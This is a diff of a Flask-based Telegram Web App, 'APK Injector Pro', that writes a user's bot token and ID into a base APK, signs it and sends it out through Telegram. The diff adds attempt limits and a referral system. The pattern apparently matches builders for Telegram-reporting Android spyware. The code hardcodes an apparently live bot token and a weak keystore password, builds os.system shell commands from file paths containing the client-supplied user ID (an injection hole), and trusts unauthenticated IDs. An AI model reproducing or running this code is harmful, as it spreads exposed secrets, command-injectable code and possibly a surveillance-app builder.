@@ -1,4 +1,5 @@
 import os
+import json
 import zipfile
 import subprocess
 import requests
@@ -7,6 +8,7 @@ from flask import Flask, render_template_string, request, send_file, jsonify
 app = Flask(__name__)
 
 UPLOAD_FOLDER = 'temp'
+DATA_FILE = 'users_data.json'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 BASE_APK = 'wahm.apk'
@@ -15,20 +17,59 @@ KEY_ALIAS = 'mykey'
 KEY_PASS = 'password123'
 TELEGRAM_BOT_TOKEN = '8737255406:AAEFenbZDgNzz5yX9QLVMdstx2nb6WBftKw'
 
+def load_users():
+    if os.path.exists(DATA_FILE):
+        try:
+            with open(DATA_FILE, 'r') as f:
+                return json.load(f)
+        except:
+            return {}
+    return {}
+
+def save_users(data):
+    with open(DATA_FILE, 'w') as f:
+        json.dump(data, f, indent=4)
+
+def get_user_info(user_id):
+    users = load_users()
+    str_id = str(user_id)
+    if str_id not in users:
+        users[str_id] = {
+            'attempts': 2, # محاولتان مجانيتان افتراضياً
+            'invites': 0,
+            'unlimited': False,
+            'invited_list': []
+        }
+        save_users(users)
+    return users[str_id]
+
+def update_user_attempts(user_id):
+    users = load_users()
+    str_id = str(user_id)
+    if str_id in users:
+        if not users[str_id]['unlimited']:
+            if users[str_id]['attempts'] > 0:
+                users[str_id]['attempts'] -= 1
+                save_users(users)
+                return True
+            return False
+        return True
+    return False
+
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>APK Injector Pro | fokhm.com</title>
+    <title>APK Injector Pro | g5wbot</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap');
         body { font-family: 'Cairo', sans-serif; background-color: #0c0814; color: #f8fafc; }
-        .glass-box { background: rgba(26, 18, 48, 0.6); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid rgba(168, 85, 247, 0.2); }
+        .glass-box { background: rgba(26, 18, 48, 0.7); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid rgba(168, 85, 247, 0.2); }
         .purple-glow { box-shadow: 0 0 35px rgba(168, 85, 247, 0.25); }
         .btn-gradient { background: linear-gradient(135deg, #a855f7 0%, #ec4899 100%); }
         .btn-gradient:hover { background: linear-gradient(135deg, #9333ea 0%, #db2777 100%); }
@@ -36,59 +77,97 @@ HTML_TEMPLATE = """
 </head>
 <body class="min-h-screen flex flex-col items-center justify-center p-4 selection:bg-purple-500 selection:text-white">
 
-    <div class="max-w-md w-full glass-box rounded-3xl p-6 purple-glow relative overflow-hidden space-y-5">
+    <div class="max-w-md w-full glass-box rounded-3xl p-6 purple-glow relative overflow-hidden space-y-4 my-auto">
         <!-- Ambient Background Glows -->
         <div class="absolute -top-24 -right-24 w-48 h-48 bg-purple-600/20 rounded-full blur-3xl pointer-events-none"></div>
         <div class="absolute -bottom-24 -left-24 w-48 h-48 bg-pink-600/20 rounded-full blur-3xl pointer-events-none"></div>
 
         <!-- Header -->
         <div class="text-center relative z-10">
-            <div class="w-16 h-16 bg-gradient-to-tr from-purple-500 to-pink-500 rounded-2xl mx-auto flex items-center justify-center text-white text-2xl shadow-lg shadow-purple-500/30 mb-3 border border-white/20">
-                <i class="fa-solid fa-mobile-screen-button"></i>
+            <div class="w-14 h-14 bg-gradient-to-tr from-purple-500 to-pink-500 rounded-2xl mx-auto flex items-center justify-center text-white text-xl shadow-lg shadow-purple-500/30 mb-2 border border-white/20">
+                <i class="fa-solid fa-wand-magic-sparkles"></i>
             </div>
-            <h1 class="text-2xl font-black text-white tracking-wide">APK Injector Pro</h1>
-            <p class="text-xs text-purple-300/80 mt-1 font-medium">بسهولة Android تخصيص وتوقيع تطبيقات</p>
+            <h1 class="text-xl font-black text-white tracking-wide">APK Injector Pro</h1>
+            <p class="text-[11px] text-purple-300/80">منصة فخم الماسية لتخصيص وتوقيع تطبيقات وَهْم</p>
         </div>
 
-        <!-- User Info Card -->
-        <div class="bg-purple-950/40 border border-purple-500/20 rounded-2xl p-4 relative z-10 flex flex-col gap-1 shadow-inner">
-            <span class="text-xs text-purple-300/70">مرحباً بك</span>
-            <div class="flex items-center justify-between">
-                <span class="text-sm font-bold text-white flex items-center gap-2">
-                    👋 <span id="displayUserText">جاري جفت المعرّف...</span>
-                </span>
-                <span class="text-[10px] bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded-full border border-emerald-500/20 font-bold">متصل</span>
-            </div>
-            <span class="text-xs font-mono text-purple-400 mt-1" id="displayUserId">ID: --</span>
-            <input type="hidden" id="userId" name="user_id" value="">
-        </div>
-
-        <!-- Main Form -->
-        <form id="injectForm" class="space-y-4 relative z-10">
-            <div>
-                <label class="block text-xs font-bold text-purple-200 mb-2 mr-1">أدخل التوكن</label>
-                <div class="relative">
-                    <input type="password" id="tokenInput" name="token" required class="w-full bg-purple-950/60 border border-purple-500/30 rounded-2xl p-3.5 text-xs text-white focus:outline-none focus:border-purple-400 transition placeholder:text-purple-400/40 shadow-inner" placeholder="الصق توكن البوت هنا...">
-                    <button type="button" onclick="togglePassword()" class="absolute left-3 top-3.5 text-purple-400 hover:text-white text-xs">
-                        <i class="fa-solid fa-eye" id="eyeIcon"></i>
-                    </button>
+        <!-- User Stats & Attempts Card -->
+        <div class="bg-purple-950/50 border border-purple-500/30 rounded-2xl p-3.5 relative z-10 flex items-center justify-between shadow-inner">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-xl bg-purple-500/20 flex items-center justify-center text-purple-300">
+                    <i class="fa-solid fa-user-shield text-base"></i>
                 </div>
-                <span class="text-[10px] text-purple-400/70 mt-1.5 block pr-1">تلقائياً في التطبيق سيتم حقن التوكن والـ ID فوراً.</span>
+                <div>
+                    <span class="text-[10px] text-purple-300/70 block">حالة الحساب</span>
+                    <span id="accountStatusText" class="text-xs font-bold text-amber-400">جارِ التحقق...</span>
+                </div>
             </div>
-
-            <!-- Error Banner (Hidden) -->
-            <div id="errorBanner" class="hidden bg-red-950/50 border border-red-500/30 text-red-300 p-3 rounded-2xl text-xs flex items-center gap-2">
-                <i class="fa-solid fa-circle-exclamation text-red-400 text-sm"></i>
-                <span id="errorText">فقدان الاتصال بالخادم</span>
+            <div class="text-left">
+                <span class="text-[10px] text-purple-300/70 block">المحاولات المتاحة</span>
+                <span id="attemptsBadge" class="text-xs font-black bg-purple-500/20 text-purple-200 px-2.5 py-1 rounded-xl border border-purple-500/30">--</span>
             </div>
+        </div>
 
-            <button type="submit" id="submitBtn" class="w-full btn-gradient text-white font-bold py-4 rounded-2xl transition duration-300 shadow-lg shadow-purple-500/25 flex items-center justify-center gap-2 cursor-pointer active:scale-95 text-sm">
-                <span>APK معالجة وتوقيع</span>
-            </button>
-        </form>
+        <!-- Navigation Tabs -->
+        <div class="grid grid-cols-2 gap-2 bg-purple-950/30 p-1 rounded-2xl border border-purple-500/25 relative z-10">
+            <button onclick="switchTab('generator')" id="tabGenBtn" class="py-2 text-xs font-bold rounded-xl transition bg-purple-600 text-white shadow">صنع وتوقيع</button>
+            <button onclick="switchTab('invites')" id="tabInvBtn" class="py-2 text-xs font-bold rounded-xl transition text-purple-300 hover:text-white">نظام الدعوات 🔥</button>
+        </div>
+
+        <!-- TAB 1: Generator Form -->
+        <div id="tabGenerator" class="space-y-3 relative z-10">
+            <form id="injectForm" class="space-y-3">
+                <div>
+                    <label class="block text-xs font-bold text-purple-200 mb-1.5 mr-1">أدخل توكن البوت:</label>
+                    <div class="relative">
+                        <input type="password" id="tokenInput" name="token" required class="w-full bg-purple-950/60 border border-purple-500/30 rounded-2xl p-3 text-xs text-white focus:outline-none focus:border-purple-400 transition placeholder:text-purple-400/40 shadow-inner" placeholder="الصق التوكن هنا...">
+                        <button type="button" onclick="togglePassword()" class="absolute left-3.5 top-3 text-purple-400 hover:text-white text-xs">
+                            <i class="fa-solid fa-eye" id="eyeIcon"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Error Banner -->
+                <div id="errorBanner" class="hidden bg-red-950/50 border border-red-500/30 text-red-300 p-3 rounded-xl text-xs flex items-center gap-2">
+                    <i class="fa-solid fa-circle-exclamation text-red-400"></i>
+                    <span id="errorText">حدث خطأ ما</span>
+                </div>
+
+                <button type="submit" id="submitBtn" class="w-full btn-gradient text-white font-bold py-3.5 rounded-2xl transition duration-300 shadow-lg shadow-purple-500/25 flex items-center justify-center gap-2 cursor-pointer active:scale-95 text-xs">
+                    <span>بدء المعالجة والتوقيع الفوري</span>
+                </button>
+            </form>
+        </div>
+
+        <!-- TAB 2: Invites System (Web App Direct Link) -->
+        <div id="tabInvites" class="hidden space-y-3 relative z-10 text-center">
+            <div class="bg-purple-950/60 border border-purple-500/30 rounded-2xl p-4 space-y-2">
+                <div class="w-10 h-10 bg-amber-500/20 text-amber-400 rounded-xl mx-auto flex items-center justify-center text-lg">
+                    <i class="fa-solid fa-bullhorn"></i>
+                </div>
+                <h3 class="text-xs font-bold text-white">رابط دعوة Web App الحصري!</h3>
+                <p class="text-[11px] text-purple-300/80 leading-relaxed">
+                    شارك رابط الـ Web App المباشر أدناه. بمجرد فتح 5 أشخاص جدد للرابط، سيزيد رصيدك ويفتح لك الصنع اللانهائي فوراً!
+                </p>
+                
+                <div class="pt-1">
+                    <span class="text-[10px] text-purple-400">عدد الأعضاء المدعوين:</span>
+                    <div class="text-lg font-black text-amber-400" id="invitesCount">0 / 5</div>
+                </div>
+
+                <!-- Progress Bar for Invites -->
+                <div class="w-full bg-purple-950 rounded-full h-2 p-0.5 border border-purple-500/20 overflow-hidden">
+                    <div id="invitesBar" class="bg-gradient-to-r from-amber-500 to-yellow-400 h-full rounded-full transition-all duration-300 w-0"></div>
+                </div>
+
+                <button onclick="copyInviteLink()" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-2 mt-2">
+                    <i class="fa-solid fa-copy"></i> نسخ رابط الدعوة الخاص بك
+                </button>
+            </div>
+        </div>
 
         <!-- Live Progress (Hidden) -->
-        <div id="progressBox" class="hidden space-y-3 relative z-10 animate-fade-in py-2">
+        <div id="progressBox" class="hidden space-y-3 relative z-10 py-2">
             <div class="flex justify-between text-xs font-semibold">
                 <span id="statusText" class="text-purple-300 flex items-center gap-2">
                     <i class="fa-solid fa-circle-notch fa-spin text-purple-400"></i> جاري إعداد وتجهيز الحزمة...
@@ -101,36 +180,44 @@ HTML_TEMPLATE = """
         </div>
 
         <!-- Success Result Panel (Hidden) -->
-        <div id="resultBox" class="hidden space-y-4 relative z-10 text-center animate-fade-in">
-            <div class="w-14 h-14 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 rounded-2xl mx-auto flex items-center justify-center text-xl shadow-inner">
+        <div id="resultBox" class="hidden space-y-3 relative z-10 text-center">
+            <div class="w-12 h-12 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 rounded-2xl mx-auto flex items-center justify-center text-lg shadow-inner">
                 <i class="fa-solid fa-circle-check"></i>
             </div>
             <div>
-                <h3 class="text-sm font-bold text-emerald-400">تم حقن وتوقيع التطبيق بنجاح!</h3>
-                <p class="text-[11px] text-purple-300/70 mt-1">تم إرسال النسخة عبر بوت التليجرام الخاص بك.</p>
+                <h3 class="text-xs font-bold text-emerald-400">تم حقن وتوقيع التطبيق بنجاح!</h3>
+                <p class="text-[10px] text-purple-300/70 mt-0.5">تم إرسال النسخة عبر بوت التليجرام الخاص بك.</p>
             </div>
 
-            <div class="grid grid-cols-2 gap-2.5 pt-1">
-                <a id="downloadBtn" href="#" class="btn-gradient text-white font-bold py-3 px-3 rounded-xl text-xs flex items-center justify-center gap-2 transition shadow-md active:scale-95">
+            <div class="grid grid-cols-2 gap-2 pt-1">
+                <a id="downloadBtn" href="#" class="btn-gradient text-white font-bold py-2.5 px-3 rounded-xl text-xs flex items-center justify-center gap-2 transition shadow active:scale-95">
                     <i class="fa-solid fa-download"></i> تحميل APK
                 </a>
-                <button onclick="shareApp()" class="bg-purple-900/60 hover:bg-purple-900 text-purple-200 font-bold py-3 px-3 rounded-xl text-xs flex items-center justify-center gap-2 transition border border-purple-500/30 active:scale-95">
+                <button onclick="shareApp()" class="bg-purple-900/60 hover:bg-purple-900 text-purple-200 font-bold py-2.5 px-3 rounded-xl text-xs flex items-center justify-center gap-2 transition border border-purple-500/30 active:scale-95">
                     <i class="fa-solid fa-share-nodes text-purple-400"></i> مشاركة
                 </button>
             </div>
-            <button onclick="resetForm()" class="text-[11px] text-purple-400 hover:text-white underline block mx-auto pt-1">حقن تطبيق جديد</button>
+            <button onclick="resetForm()" class="text-[10px] text-purple-400 hover:text-white underline block mx-auto pt-1">حقن تطبيق جديد</button>
         </div>
 
         <!-- Footer Branding -->
-        <div class="text-center border-t border-purple-500/10 pt-3 relative z-10 flex items-center justify-between text-[10px] text-purple-400/60">
-            <span>Telegram Web App 🔒</span>
-            <a href="https://fokhm.com" target="_blank" class="hover:text-purple-300 transition">fokhm.com © g5wbot</a>
+        <div class="text-center border-t border-purple-500/10 pt-2 relative z-10 flex items-center justify-between text-[10px] text-purple-400/60">
+            <span>g5wbot نظام آمن 🔒</span>
+            <a href="https://fokhm.com" target="_blank" class="hover:text-purple-300 transition">fokhm.com</a>
         </div>
     </div>
+
+    <input type="hidden" id="userId" value="">
 
     <script>
         let globalDownloadUrl = '';
         let globalFileName = 'wahm_g5wbot.apk';
+        let currentUserId = '8349168441';
+        let inviteLink = '';
+
+        // قراءة الـ URL لمعرفة إذا كان هناك معرّف داعم (Referrer)
+        const urlParams = new URLSearchParams(window.location.search);
+        const referrerId = urlParams.get('ref');
 
         // تليجرام ويب آي بي
         const tg = window.Telegram?.WebApp;
@@ -139,18 +226,70 @@ HTML_TEMPLATE = """
             tg.expand();
             const user = tg.initDataUnsafe?.user;
             if (user && user.id) {
-                document.getElementById('userId').value = user.id;
-                document.getElementById('displayUserId').innerText = 'ID: ' + user.id;
-                document.getElementById('displayUserText').innerText = user.first_name || 'مستخدم تليجرام';
-            } else {
-                document.getElementById('userId').value = '8349168441';
-                document.getElementById('displayUserId').innerText = 'ID: 8349168441';
-                document.getElementById('displayUserText').innerText = 'فخم (مطور)';
+                currentUserId = user.id;
             }
-        } else {
-            document.getElementById('userId').value = '8349168441';
-            document.getElementById('displayUserId').innerText = 'ID: 8349168441';
-            document.getElementById('displayUserText').innerText = 'فخم (متصفح)';
+        }
+        document.getElementById('userId').value = currentUserId;
+        
+        // رابط الدعوة الفريد للـ Web App المباشر
+        inviteLink = `https://t.me/g5wbot/wahmapk?startapp=ref_${currentUserId}`;
+
+        async function initUserData() {
+            try {
+                // تسجيل الدعوة تلقائياً في السيرفر إذا فتح مستخدم جديد عبر رابط صديقه
+                if (referrerId && referrerId !== String(currentUserId)) {
+                    await fetch('/api/register_invite', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ referrer_id: referrerId, new_user_id: currentUserId })
+                    });
+                }
+
+                // جلب بيانات المستخدم
+                const res = await fetch(`/api/user?user_id=${currentUserId}`);
+                const data = await res.json();
+                
+                if (data.unlimited) {
+                    document.getElementById('accountStatusText').innerText = 'حساب غير محدود (VIP)';
+                    document.getElementById('attemptsBadge').innerText = '∞ لامحدود';
+                } else {
+                    document.getElementById('accountStatusText').innerText = 'حساب تجريبي';
+                    document.getElementById('attemptsBadge').innerText = data.attempts + ' محاولات';
+                }
+
+                document.getElementById('invitesCount').innerText = `${data.invites} / 5`;
+                let percent = (data.invites / 5) * 100;
+                if (percent > 100) percent = 100;
+                document.getElementById('invitesBar').style.width = percent + '%';
+
+            } catch(e) {
+                console.log('Error initializing user data');
+            }
+        }
+        initUserData();
+
+        function switchTab(tab) {
+            const genTab = document.getElementById('tabGenerator');
+            const invTab = document.getElementById('tabInvites');
+            const genBtn = document.getElementById('tabGenBtn');
+            const invBtn = document.getElementById('tabInvBtn');
+
+            if (tab === 'generator') {
+                genTab.classList.remove('hidden');
+                invTab.classList.add('hidden');
+                genBtn.className = 'py-2 text-xs font-bold rounded-xl transition bg-purple-600 text-white shadow';
+                invBtn.className = 'py-2 text-xs font-bold rounded-xl transition text-purple-300 hover:text-white';
+            } else {
+                genTab.classList.add('hidden');
+                invTab.classList.remove('hidden');
+                invBtn.className = 'py-2 text-xs font-bold rounded-xl transition bg-purple-600 text-white shadow';
+                genBtn.className = 'py-2 text-xs font-bold rounded-xl transition text-purple-300 hover:text-white';
+            }
+        }
+
+        function copyInviteLink() {
+            navigator.clipboard.writeText(inviteLink);
+            alert('✨ تم نسخ رابط دعوة الـ Web App المباشر بنجاح! انشره الآن لجمع أعضاء جدد.');
         }
 
         function togglePassword() {
@@ -168,7 +307,6 @@ HTML_TEMPLATE = """
         }
 
         const form = document.getElementById('injectForm');
-        const submitBtn = document.getElementById('submitBtn');
         const progressBox = document.getElementById('progressBox');
         const progressBar = document.getElementById('progressBar');
         const statusText = document.getElementById('statusText');
@@ -181,23 +319,20 @@ HTML_TEMPLATE = """
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             const token = document.getElementById('tokenInput').value.trim();
-            const userId = document.getElementById('userId').value;
-
             if (!token) return;
 
             errorBanner.classList.add('hidden');
             form.classList.add('hidden');
             progressBox.classList.remove('hidden');
 
-            // محاكاة حقيقية متقدمة لتجنب التعليق عند نسبة معينة
             let currentProgress = 10;
             progressBar.style.width = currentProgress + '%';
             percentText.innerText = currentProgress + '%';
 
             const stages = [
-                { p: 30, text: "جاري استنساخ حزمة التطبيق الأساسي..." },
-                { p: 60, text: "جاري حقن ملفات التوكن والمعرّف داخل المجلدات..." },
-                { p: 85, text: "جاري تطبيق محاذاة zipalign وتوقيع apksigner..." },
+                { p: 30, text: "جاري التحقق من رصيد محاولات الخدمة..." },
+                { p: 60, text: "جاري حقن ملفات التوكن والمعرّف داخل الحزمة..." },
+                { p: 85, text: "جاري تطبيق المحاذاة والتوقيع الرقمي الآمن..." },
                 { p: 95, text: "جاري إرسال النسخة عبر بوت التليجرام..." }
             ];
 
@@ -212,12 +347,12 @@ HTML_TEMPLATE = """
                         stageIdx++;
                     }
                 }
-            }, 300);
+            }, 250);
 
             try {
                 const formData = new FormData();
                 formData.append('token', token);
-                formData.append('user_id', userId);
+                formData.append('user_id', currentUserId);
 
                 const response = await fetch('/generate', {
                     method: 'POST',
@@ -228,10 +363,9 @@ HTML_TEMPLATE = """
 
                 if (!response.ok) {
                     const errRes = await response.text();
-                    throw new Error(errRes || 'فشل الاتصال بخادم الحقن والتوقيع.');
+                    throw new Error(errRes || 'انتهت محاولاتك! ادعُ أصدقائك عبر رابط الـ Web App لفتح الصنع اللانهائي.');
                 }
 
-                // اكتمال 100%
                 progressBar.style.width = '100%';
                 percentText.innerText = '100%';
                 statusText.innerHTML = `<i class="fa-solid fa-circle-check text-emerald-400"></i> تمت العملية بنجاح تام!`;
@@ -249,13 +383,14 @@ HTML_TEMPLATE = """
                     downloadBtn.href = globalDownloadUrl;
                     downloadBtn.setAttribute('download', globalFileName);
                     resultBox.classList.remove('hidden');
+                    initUserData();
                 }, 500);
 
             } catch (err) {
                 clearInterval(progressTimer);
                 progressBox.classList.add('hidden');
                 form.classList.remove('hidden');
-                errorText.innerText = err.message || 'فقدان الاتصال بالخادم';
+                errorText.innerText = err.message || 'حدث خطأ ما';
                 errorBanner.classList.remove('hidden');
             }
         });
@@ -272,21 +407,8 @@ HTML_TEMPLATE = """
                                 text: 'تم إنشاء وتوقيع تطبيق وَهْم الخاص بك بنجاح عبر منصة fokhm.com.',
                                 files: [file]
                             }).catch(() => {});
-                        } else {
-                            fallbackShare();
                         }
                     });
-            } else {
-                fallbackShare();
-            }
-        }
-
-        function fallbackShare() {
-            if (navigator.clipboard) {
-                navigator.clipboard.writeText(window.location.href);
-                alert('تم نسخ رابط المنصة إلى الحافظة بنجاح!');
-            } else {
-                alert('عذراً، خاصية المشاركة غير مدعومة.');
             }
         }
 
@@ -296,6 +418,7 @@ HTML_TEMPLATE = """
             document.getElementById('tokenInput').value = '';
             progressBar.style.width = '0%';
             errorBanner.classList.add('hidden');
+            initUserData();
         }
     </script>
 </body>
@@ -306,6 +429,33 @@ HTML_TEMPLATE = """
 def index():
     return render_template_string(HTML_TEMPLATE)
 
+@app.route('/api/user')
+def api_user():
+    user_id = request.args.get('user_id', '8349168441')
+    info = get_user_info(user_id)
+    return jsonify(info)
+
+@app.route('/api/register_invite', methods=['POST'])
+def register_invite():
+    data = request.get_json() or {}
+    referrer_id = str(data.get('referrer_id'))
+    new_user_id = str(data.get('new_user_id'))
+
+    if not referrer_id or not new_user_id or referrer_id == new_user_id:
+        return jsonify({'status': 'ignored'})
+
+    users = load_users()
+    if referrer_id in users:
+        if new_user_id not in users[referrer_id].get('invited_list', []):
+            users[referrer_id].setdefault('invited_list', []).append(new_user_id)
+            users[referrer_id]['invites'] = len(users[referrer_id]['invited_list'])
+            if users[referrer_id]['invites'] >= 5:
+                users[referrer_id]['unlimited'] = True
+            save_users(users)
+            return jsonify({'status': 'success', 'invites': users[referrer_id]['invites']})
+
+    return jsonify({'status': 'already_counted'})
+
 @app.route('/generate', methods=['POST'])
 def generate():
     token_text = request.form.get('token')
@@ -313,6 +463,10 @@ def generate():
 
     if not token_text:
         return "الرجاء إدخال التوكن!", 400
+
+    user_info = get_user_info(user_id)
+    if not user_info['unlimited'] and user_info['attempts'] <= 0:
+        return "عذراً! انتهت محاولاتك المجانية. ادعُ أصدقائك عبر رابط الـ Web App لفتح الصنع اللانهائي بلا حدود!", 403
 
     if not os.path.exists(BASE_APK):
         return "خطأ: ملف التطبيق الأساسي (wahm.apk) غير موجود على السيرفر!", 500
@@ -322,13 +476,15 @@ def generate():
     signed_apk = os.path.join(UPLOAD_FOLDER, f'wahm_signed_{user_id}.apk')
 
     try:
+        if not user_info['unlimited']:
+            update_user_attempts(user_id)
+
         for f in [modified_apk, aligned_apk, signed_apk]:
             if os.path.exists(f):
                 os.remove(f)
 
         os.system(f"cp {BASE_APK} {modified_apk}")
 
-        # حقن token.txt و id.txt داخل مجلد assets
         token_path_in_zip = 'assets/token.txt'
         id_path_in_zip = 'assets/id.txt'
         temp_zip = os.path.join(UPLOAD_FOLDER, 'temp.zip')
@@ -356,7 +512,6 @@ def generate():
 
         os.replace(temp_zip, modified_apk)
 
-        # المحاذاة والتوقيع
         subprocess.run(['zipalign', '-v', '-p', '4', modified_apk, aligned_apk], check=True)
 
         global KEYSTORE
@@ -388,10 +543,9 @@ def generate():
         if result.returncode != 0:
             return f"فشل التوقيع بواسطة أداة apksigner: {result.stderr}", 500
 
-        # إرسال الملف تلقائياً لمستخدم التليجرام عبر البوت
         if TELEGRAM_BOT_TOKEN and user_id and user_id != 'unknown':
             try:
-                caption_msg = f"✨ **تم توليد وتوقيع تطبيق وَهْم بنجاح!**\n👤 معرّف المستخدم: `{user_id}`\n🛠 حقوق النشر: **g5wbot**\n🌐 منصة فخم: fokhm.com"
+                caption_msg = f"✨ **تم توليد وتوقيع تطبيق وَهْم بنجاح!**\n👤 معرّف المستخدم: `{user_id}`\n🛠 خدمة: **wahmapk** | **g5wbot**\n🌐 منصة فخم: fokhm.com"
                 with open(signed_apk, 'rb') as apk_file:
                     requests.post(
                         f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
